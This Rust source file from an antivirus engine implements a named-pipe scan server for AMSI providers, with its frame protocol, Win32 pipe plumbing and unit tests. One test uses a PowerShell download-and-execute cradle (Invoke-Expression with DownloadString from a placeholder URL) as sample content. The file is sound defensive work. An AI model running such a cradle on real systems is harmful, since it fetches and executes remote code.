//! The scan channel: a named pipe other processes can ask for a verdict on.
//!
//! # Why this exists
//!
//! An AMSI provider DLL is loaded into *every* process that uses AMSI -
//! PowerShell, Office, WSH, the .NET runtime. Redoubt's engine holds a
//! multi-hundred-megabyte pattern automaton, and loading that into every host
//! process would be catastrophic; a machine running six PowerShell tabs would
//! lose gigabytes.
//!
//! So the provider is a thin client. It sends bytes down this pipe and gets a
//! verdict back. One engine, in one process, however many hosts are asking.
//!
//! # Failing open
//!
//! If the service is not running, or is slow, a caller **must** treat that as
//! "not detected" and let the content run. A security tool that blocks every
//! script when its own service is down does not fail safe - it makes the
//! machine unusable and gets itself uninstalled. The risk window is real and is
//! accepted deliberately.
//!
//! # Protocol
//!
//! Deliberately trivial, because the client is unsafe COM code in a foreign
//! process and every extra byte of parsing there is a liability:
//!
//! ```text
//! request   u32 length (LE) | u32 flags (LE) | content bytes
//! response  u8 verdict | u32 name length (LE) | name bytes
//! ```
//!
//! Verdict is 0 clean, 1 suspicious, 2 malicious.

use anyhow::{Context, Result};
use redoubt_core::scanner::ScanEngine;
use redoubt_core::verdict::Severity;
use std::io::{Read, Write};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;

/// Where the pipe lives. Fixed, because the AMSI provider has no configuration
/// of its own - it is loaded by processes that know nothing about Redoubt.
pub const PIPE_NAME: &str = r"\\.\pipe\Redoubt.Scan";

/// Largest content a caller may submit.
///
/// AMSI hands over script text and macro bodies, which are small. A cap keeps
/// a hostile or broken client from making the service allocate without bound.
pub const MAX_REQUEST: u32 = 16 * 1024 * 1024;

/// Wire verdict values.
pub const VERDICT_CLEAN: u8 = 0;
pub const VERDICT_SUSPICIOUS: u8 = 1;
pub const VERDICT_MALICIOUS: u8 = 2;

fn wire_verdict(s: Severity) -> u8 {
    match s {
        Severity::Clean => VERDICT_CLEAN,
        Severity::Suspicious => VERDICT_SUSPICIOUS,
        Severity::Malicious => VERDICT_MALICIOUS,
    }
}

/// Counters for the UI.
#[derive(Debug, Default)]
pub struct IpcCounters {
    pub requests: AtomicU64,
    pub malicious: AtomicU64,
    pub suspicious: AtomicU64,
    pub errors: AtomicU64,
}

/// Scan one request body and produce the response bytes.
///
/// Split out from the pipe plumbing so the protocol is testable without any
/// named pipes involved.
pub fn handle_request(engine: &ScanEngine, content: &[u8], counters: &IpcCounters) -> Vec<u8> {
    counters.requests.fetch_add(1, Ordering::Relaxed);

    let mut session = engine.session();
    // The label is what appears in logs and the UI. Content arriving here has
    // no path - it is script text held in another process's memory.
    let verdict = session.scan_bytes(std::path::Path::new("<amsi>"), content);

    match verdict.severity {
        Severity::Malicious => {
            counters.malicious.fetch_add(1, Ordering::Relaxed);
        }
        Severity::Suspicious => {
            counters.suspicious.fetch_add(1, Ordering::Relaxed);
        }
        Severity::Clean => {}
    }

    let name = verdict.primary_name().unwrap_or("").to_string();
    encode_response(wire_verdict(verdict.severity), &name)
}

/// Build a response frame.
pub fn encode_response(verdict: u8, name: &str) -> Vec<u8> {
    let name_bytes = name.as_bytes();
    let mut out = Vec::with_capacity(5 + name_bytes.len());
    out.push(verdict);
    out.extend_from_slice(&(name_bytes.len() as u32).to_le_bytes());
    out.extend_from_slice(name_bytes);
    out
}

/// Parse a response frame. Returns `(verdict, name)`.
pub fn decode_response(bytes: &[u8]) -> Option<(u8, String)> {
    if bytes.len() < 5 {
        return None;
    }
    let verdict = bytes[0];
    let len = u32::from_le_bytes(bytes[1..5].try_into().ok()?) as usize;
    if bytes.len() < 5 + len {
        return None;
    }
    Some((verdict, String::from_utf8_lossy(&bytes[5..5 + len]).into_owned()))
}

/// Build a request frame.
pub fn encode_request(content: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(8 + content.len());
    out.extend_from_slice(&(content.len() as u32).to_le_bytes());
    out.extend_from_slice(&0u32.to_le_bytes()); // flags, reserved
    out.extend_from_slice(content);
    out
}

/// The running pipe server.
pub struct ScanServer {
    stop: Arc<AtomicBool>,
    thread: Option<std::thread::JoinHandle<()>>,
    counters: Arc<IpcCounters>,
}

impl ScanServer {
    pub fn counters(&self) -> Arc<IpcCounters> {
        self.counters.clone()
    }

    /// Start accepting connections.
    pub fn start(engine: Arc<ScanEngine>) -> Result<Self> {
        let stop = Arc::new(AtomicBool::new(false));
        let counters = Arc::new(IpcCounters::default());

        // Returning before the first pipe instance exists would make
        // `listening: true` briefly untrue: a client connecting in that window
        // gets ERROR_FILE_NOT_FOUND, and the provider - correctly - treats
        // that as "no service" and lets the content run. Small window, but it
        // is exactly the window when a machine is starting up.
        let (ready_tx, ready_rx) = std::sync::mpsc::sync_channel::<()>(1);

        let thread = {
            let stop = stop.clone();
            let counters = counters.clone();
            std::thread::Builder::new()
                .name("redoubt-scan-pipe".into())
                .spawn(move || accept_loop(engine, stop, counters, ready_tx))
                .context("spawning the scan pipe thread")?
        };

        // Bounded: a pipe that cannot be created will not start existing while
        // we block the caller. The loop reports the real error either way.
        let _ = ready_rx.recv_timeout(std::time::Duration::from_secs(5));

        Ok(Self { stop, thread: Some(thread), counters })
    }

    pub fn stop(&mut self) {
        self.stop.store(true, Ordering::Relaxed);
        // Wake the blocking ConnectNamedPipe by connecting to it once.
        let _ = std::fs::OpenOptions::new().read(true).write(true).open(PIPE_NAME);
        if let Some(t) = self.thread.take() {
            let _ = t.join();
        }
    }
}

impl Drop for ScanServer {
    fn drop(&mut self) {
        self.stop();
    }
}

fn accept_loop(
    engine: Arc<ScanEngine>,
    stop: Arc<AtomicBool>,
    counters: Arc<IpcCounters>,
    ready: std::sync::mpsc::SyncSender<()>,
) {
    // Fires once, when the first instance exists and a client could connect.
    let mut ready = Some(ready);
    while !stop.load(Ordering::Relaxed) {
        match pipe::create_and_wait(&stop, &mut || {
            if let Some(tx) = ready.take() {
                let _ = tx.try_send(());
            }
        }) {
            Ok(Some(mut conn)) => {
                let engine = engine.clone();
                let counters = counters.clone();
                // One thread per connection. AMSI callers are short-lived and
                // infrequent; a pool would be more machinery than the traffic
                // justifies.
                let _ = std::thread::Builder::new()
                    .name("redoubt-scan-conn".into())
                    .spawn(move || {
                        if let Err(e) = serve_one(&engine, &mut conn, &counters) {
                            counters.errors.fetch_add(1, Ordering::Relaxed);
                            tracing::debug!(error = %e, "scan pipe client error");
                        }
                    });
            }
            Ok(None) => break, // stopping
            Err(e) => {
                tracing::warn!(error = %e, "scan pipe accept failed");
                std::thread::sleep(std::time::Duration::from_millis(500));
            }
        }
    }
}

fn serve_one(
    engine: &ScanEngine,
    conn: &mut pipe::Connection,
    counters: &IpcCounters,
) -> Result<()> {
    let mut header = [0u8; 8];
    conn.read_exact(&mut header).context("reading request header")?;
    let len = u32::from_le_bytes(header[0..4].try_into().unwrap());

    if len > MAX_REQUEST {
        // Answer rather than hanging up: a client that gets no reply has to
        // decide what to do with a timeout, and the safe answer there is the
        // one we can just give it directly.
        conn.write_all(&encode_response(VERDICT_CLEAN, "request too large"))?;
        anyhow::bail!("request of {len} bytes exceeds the {MAX_REQUEST} byte cap");
    }

    let mut content = vec![0u8; len as usize];
    conn.read_exact(&mut content).context("reading request body")?;

    let response = handle_request(engine, &content, counters);
    conn.write_all(&response).context("writing response")?;
    conn.flush().ok();
    Ok(())
}

/// Named-pipe plumbing.
///
/// `std` has no named-pipe server, so this is the minimum Win32 needed: create
/// an instance, wait for a client, hand back something implementing `Read` and
/// `Write`.
mod pipe {
    use anyhow::{bail, Result};
    use std::os::windows::io::{FromRawHandle, OwnedHandle};
    use std::sync::atomic::{AtomicBool, Ordering};

    use windows_sys::Win32::Foundation::{ERROR_PIPE_CONNECTED, HANDLE, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::Security::{
        InitializeSecurityDescriptor, SetSecurityDescriptorDacl, PSECURITY_DESCRIPTOR,
        SECURITY_ATTRIBUTES, SECURITY_DESCRIPTOR,
    };
    // PIPE_ACCESS_* live under Storage::FileSystem because they share the
    // FILE_FLAGS_AND_ATTRIBUTES type with CreateFile.
    use windows_sys::Win32::Storage::FileSystem::PIPE_ACCESS_DUPLEX;
    use windows_sys::Win32::System::Pipes::{
        ConnectNamedPipe, CreateNamedPipeW, DisconnectNamedPipe, PIPE_READMODE_BYTE,
        PIPE_TYPE_BYTE, PIPE_UNLIMITED_INSTANCES, PIPE_WAIT,
    };

    const SECURITY_DESCRIPTOR_REVISION: u32 = 1;

    fn wide(s: &str) -> Vec<u16> {
        s.encode_utf16().chain(std::iter::once(0)).collect()
    }

    /// A connected client.
    pub struct Connection {
        handle: OwnedHandle,
    }

    impl Connection {
        fn raw(&self) -> HANDLE {
            use std::os::windows::io::AsRawHandle;
            self.handle.as_raw_handle() as HANDLE
        }
    }

    impl Drop for Connection {
        fn drop(&mut self) {
            // SAFETY: the handle is still owned and valid until `handle` drops.
            unsafe { DisconnectNamedPipe(self.raw()) };
        }
    }

    impl std::io::Read for Connection {
        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
            use windows_sys::Win32::Storage::FileSystem::ReadFile;
            let mut read = 0u32;
            // SAFETY: `buf` is a valid writable slice of the given length.
            let ok = unsafe {
                ReadFile(
                    self.raw(),
                    buf.as_mut_ptr(),
                    buf.len() as u32,
                    &mut read,
                    std::ptr::null_mut(),
                )
            };
            if ok == 0 {
                return Err(std::io::Error::last_os_error());
            }
            Ok(read as usize)
        }
    }

    impl std::io::Write for Connection {
        fn write(&mut self, buf: &[u8]) -> std::io::Result<usize> {
            use windows_sys::Win32::Storage::FileSystem::WriteFile;
            let mut written = 0u32;
            // SAFETY: `buf` is a valid readable slice of the given length.
            let ok = unsafe {
                WriteFile(
                    self.raw(),
                    buf.as_ptr(),
                    buf.len() as u32,
                    &mut written,
                    std::ptr::null_mut(),
                )
            };
            if ok == 0 {
                return Err(std::io::Error::last_os_error());
            }
            Ok(written as usize)
        }

        fn flush(&mut self) -> std::io::Result<()> {
            use windows_sys::Win32::Storage::FileSystem::FlushFileBuffers;
            // SAFETY: the handle is valid for the lifetime of `self`.
            unsafe { FlushFileBuffers(self.raw()) };
            Ok(())
        }
    }

    /// Create a pipe instance and block until a client connects.
    ///
    /// Returns `Ok(None)` when `stop` was set while waiting.
    /// Create one pipe instance and block until a client connects.
    ///
    /// `on_created` fires once the instance exists but before waiting, so the
    /// caller can report readiness without waiting for actual traffic.
    pub fn create_and_wait(
        stop: &AtomicBool,
        on_created: &mut dyn FnMut(),
    ) -> Result<Option<Connection>> {
        // A null DACL grants everyone access. That is deliberate and needed:
        // AMSI providers load into processes at every integrity level,
        // including sandboxed and low-integrity ones, and a pipe they cannot
        // open is a pipe that silently never gets asked.
        //
        // The exposure is bounded by the protocol, which only ever accepts
        // bytes to scan and only ever returns a verdict. There is no command
        // surface here to abuse.
        let mut sd: SECURITY_DESCRIPTOR = unsafe { std::mem::zeroed() };
        // SAFETY: `sd` is a correctly sized, zeroed SECURITY_DESCRIPTOR.
        unsafe {
            InitializeSecurityDescriptor(
                &mut sd as *mut _ as PSECURITY_DESCRIPTOR,
                SECURITY_DESCRIPTOR_REVISION,
            );
            SetSecurityDescriptorDacl(
                &mut sd as *mut _ as PSECURITY_DESCRIPTOR,
                1,
                std::ptr::null_mut(),
                0,
            );
        }
        let attrs = SECURITY_ATTRIBUTES {
            nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
            lpSecurityDescriptor: &mut sd as *mut _ as *mut std::ffi::c_void,
            bInheritHandle: 0,
        };

        let name = wide(super::PIPE_NAME);
        // SAFETY: `name` is NUL-terminated; `attrs` outlives the call.
        let handle = unsafe {
            CreateNamedPipeW(
                name.as_ptr(),
                PIPE_ACCESS_DUPLEX,
                PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
                PIPE_UNLIMITED_INSTANCES,
                64 * 1024,
                64 * 1024,
                0,
                &attrs,
            )
        };
        if handle == INVALID_HANDLE_VALUE || handle.is_null() {
            bail!("CreateNamedPipeW failed: {}", std::io::Error::last_os_error());
        }

        // SAFETY: the handle came from CreateNamedPipeW and is not otherwise
        // owned.
        let owned = unsafe { OwnedHandle::from_raw_handle(handle as _) };

        // The pipe now exists in the object namespace, so a client that opens
        // it will queue rather than be told it is missing.
        on_created();

        // SAFETY: `handle` is a valid pipe instance awaiting a client.
        let connected = unsafe { ConnectNamedPipe(handle, std::ptr::null_mut()) };
        let ok = connected != 0
            || std::io::Error::last_os_error().raw_os_error() == Some(ERROR_PIPE_CONNECTED as i32);

        if stop.load(Ordering::Relaxed) {
            return Ok(None);
        }
        if !ok {
            bail!("ConnectNamedPipe failed: {}", std::io::Error::last_os_error());
        }
        Ok(Some(Connection { handle: owned }))
    }

}

/// Serialising tests that bind the scan pipe.
///
/// The pipe name is fixed and global, so two test *processes* - this crate's
/// suite and the AMSI provider's - can collide on it while cargo runs their
/// binaries in parallel. An in-process mutex cannot see across that boundary,
/// so this uses a Windows named mutex, which can.
///
/// Test-only. Nothing in the running product takes this lock.
pub mod testlock {
    use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, WAIT_FAILED};
    use windows_sys::Win32::System::Threading::{
        CreateMutexW, ReleaseMutex, WaitForSingleObject, INFINITE,
    };

    /// Released on drop, including when a test panics while holding it.
    pub struct PipeLock(HANDLE);

    // The handle is owned solely by this value and only ever released by it.
    unsafe impl Send for PipeLock {}

    impl Drop for PipeLock {
        fn drop(&mut self) {
            if !self.0.is_null() {
                // SAFETY: acquired by the matching wait in `acquire`.
                unsafe {
                    ReleaseMutex(self.0);
                    CloseHandle(self.0);
                }
            }
        }
    }

    /// Block until no other test process holds the scan pipe.
    ///
    /// A failure to create or wait on the mutex is deliberately not fatal:
    /// tests then run unserialised, which is the behaviour before this
    /// existed, rather than failing for a reason unrelated to what they test.
    pub fn acquire() -> PipeLock {
        let name: Vec<u16> = r"Local\Redoubt.ScanPipe.Test"
            .encode_utf16()
            .chain(std::iter::once(0))
            .collect();

        // SAFETY: `name` is NUL-terminated; a default-security named mutex.
        let h = unsafe { CreateMutexW(std::ptr::null(), 0, name.as_ptr()) };
        if h.is_null() {
            return PipeLock(std::ptr::null_mut());
        }
        // SAFETY: `h` is a mutex handle we just created.
        if unsafe { WaitForSingleObject(h, INFINITE) } == WAIT_FAILED {
            // SAFETY: not held, so only the handle needs closing.
            unsafe { CloseHandle(h) };
            return PipeLock(std::ptr::null_mut());
        }
        PipeLock(h)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_request_round_trips_through_the_frame_format() {
        let content = b"Invoke-Expression (New-Object Net.WebClient).DownloadString('http://x')";
        let frame = encode_request(content);

        assert_eq!(
            u32::from_le_bytes(frame[0..4].try_into().unwrap()),
            content.len() as u32
        );
        assert_eq!(&frame[8..], content);
    }

    #[test]
    fn a_response_round_trips() {
        for (verdict, name) in [
            (VERDICT_CLEAN, ""),
            (VERDICT_SUSPICIOUS, "Heuristic.Something"),
            (VERDICT_MALICIOUS, "Win.Trojan.Agent-1234"),
        ] {
            let bytes = encode_response(verdict, name);
            let (v, n) = decode_response(&bytes).expect("should decode");
            assert_eq!(v, verdict);
            assert_eq!(n, name);
        }
    }

    #[test]
    fn a_truncated_response_decodes_to_nothing_rather_than_panicking() {
        // The client for this protocol is unsafe COM code inside someone
        // else's process. It must never be handed a panic.
        assert!(decode_response(&[]).is_none());
        assert!(decode_response(&[VERDICT_MALICIOUS]).is_none());
        assert!(decode_response(&[VERDICT_MALICIOUS, 10, 0, 0, 0, b'x']).is_none());
    }

    #[test]
    fn verdict_mapping_is_stable() {
        // These values cross a process boundary into a separately-built DLL,
        // so they are part of the contract and must not be renumbered.
        assert_eq!(VERDICT_CLEAN, 0);
        assert_eq!(VERDICT_SUSPICIOUS, 1);
        assert_eq!(VERDICT_MALICIOUS, 2);
        assert_eq!(wire_verdict(Severity::Clean), VERDICT_CLEAN);
        assert_eq!(wire_verdict(Severity::Suspicious), VERDICT_SUSPICIOUS);
        assert_eq!(wire_verdict(Severity::Malicious), VERDICT_MALICIOUS);
    }

    #[test]
    fn the_pipe_name_is_fixed() {
        // The AMSI provider has no configuration - it is loaded by processes
        // that know nothing about Redoubt - so this cannot become a setting.
        assert_eq!(PIPE_NAME, r"\\.\pipe\Redoubt.Scan");
    }

    // These compare constants, which clippy reads as a tautology. They are
    // not: the constants are duplicated across two separately-built binaries
    // and these are what catch a change to one of them.
    #[allow(clippy::assertions_on_constants)]
    #[test]
    fn the_request_cap_is_sane() {
        // Large enough for any script or macro AMSI submits, small enough that
        // a hostile client cannot make the service allocate without bound.
        assert!(MAX_REQUEST >= 1024 * 1024);
        assert!(MAX_REQUEST <= 64 * 1024 * 1024);
    }
}
